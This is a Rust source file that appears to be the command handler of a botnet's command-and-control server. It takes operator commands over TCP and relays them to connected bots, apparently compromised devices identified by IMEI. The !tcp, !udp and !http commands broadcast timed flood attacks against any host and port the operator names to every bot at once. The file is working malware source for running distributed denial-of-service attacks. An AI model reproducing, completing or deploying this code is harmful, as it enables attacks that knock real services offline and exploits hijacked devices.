pub mod commend {
    use std::io::Write;
    use std::net::{Shutdown, TcpStream};
    use serde_json::Value;
    use crate::proc;
    use crate::BOT_C2_CONNECTION;

    pub fn check_commend_is_exist(commend_ref: &Value, target_commend: &str) -> i8 {
        for commend in commend_ref.as_object().unwrap().keys() {
            if target_commend.contains(commend) {
                let args_len = commend_ref.as_object().unwrap()
                    .get(commend).unwrap()
                    .get("args_len").unwrap();
                let args_len_int: i8 = args_len.to_string().parse().unwrap();
                return args_len_int;
            }
        }
        -1
    }
    pub fn check_commend_help(commend_ref: &Value, target_commend: &str) -> String {
        for commend in commend_ref.as_object().unwrap().keys() {
            if target_commend.contains(commend) {
                let help = commend_ref.as_object().unwrap()
                    .get(commend).unwrap()
                    .get("help").unwrap().as_str().unwrap();
                return help.to_string()
            }
        }
        "\0x00\0x00".to_string()
    }

    pub fn check_commend_list_help(commend_ref: &Value) -> String {
        let mut help_list = String::new();
        for commend in commend_ref.as_object().unwrap().keys() {
            let help = commend_ref.as_object().unwrap()
                .get(commend).unwrap()
                .get("help").unwrap().as_str().unwrap();
            help_list.push_str(help);
        }
        return help_list;
    }
    pub fn match_and_proceed(
        commend_prefix: &str, commend_fragmented: &Vec<&str>,
        commend_ref: &Value, mut stream: &TcpStream, bot_connection_clone: &BOT_C2_CONNECTION
    ) {

        match commend_prefix {
            "!help" => {
                let help_list = check_commend_list_help(&commend_ref);
                stream.write(help_list.as_bytes()).unwrap();
            }
            "!clear" => {
                stream.write("\u{001B}[2J".as_bytes()).unwrap();
            }
            "!bots" => {proc::c2::bots(&stream, &bot_connection_clone);}
            "!count" => {proc::c2::count(&stream, &bot_connection_clone);}
            "!exit" => {
                stream.shutdown(Shutdown::Both).unwrap();
                return;
            }
            "!air" => {
                for mut conn in bot_connection_clone.lock().unwrap().iter() {
                    if conn.imei == commend_fragmented[0].trim().parse::<u64>().unwrap() {
                        proc::c2::air(&conn.stream, conn.imei.clone())
                    }
                }
            }
            "!tcp" => {
                let host = commend_fragmented[0]
                    .trim().to_string();
                let port: u32 = commend_fragmented[1]
                    .trim().parse().unwrap();
                let duration: u32 = commend_fragmented[2]
                    .trim().parse().unwrap();

                let mut count = 0;
                for mut conn in bot_connection_clone.lock().unwrap().iter() {
                    proc::c2::l4_tcp(
                        &conn.stream, conn.imei.clone(),
                        host.clone(), port.clone(), duration.clone()
                    );
                    count += 1;
                }
                stream.write(
                    format!("Broadcast on {} device\n", count).as_bytes()
                ).unwrap();
            }
            "!udp" => {
                let host = commend_fragmented[0]
                    .trim().to_string();
                let port: u32 = commend_fragmented[1]
                    .trim().parse().unwrap();
                let duration: u32 = commend_fragmented[2]
                    .trim().parse().unwrap();

                let mut count = 0;
                for conn in bot_connection_clone.lock().unwrap().iter() {
                    proc::c2::l4_udp(
                        &conn.stream, conn.imei.clone(),
                        host.clone(), port.clone(), duration.clone()
                    );
                    count += 1;
                }
                stream.write_all(
                    format!("Broadcast on {} device\n", count).as_bytes()
                ).unwrap();
            },
            "!http" => {
                let domain = commend_fragmented[0]
                    .trim().to_string();
                let port: u32 = commend_fragmented[1]
                    .trim().parse().unwrap();
                let duration: u32 = commend_fragmented[2]
                    .trim().parse().unwrap();

                let mut count = 0;
                for mut conn in bot_connection_clone.lock().unwrap().iter() {
                    proc::c2::l7_http(
                        &conn.stream, conn.imei.clone(),
                        domain.clone(), port.clone(), duration.clone()
                    );
                    count += 1;
                }
                stream.write_all(
                    format!("Broadcast on {} device\n", count).as_bytes()
                ).unwrap();
            }
            _ => {}
        }
    }
}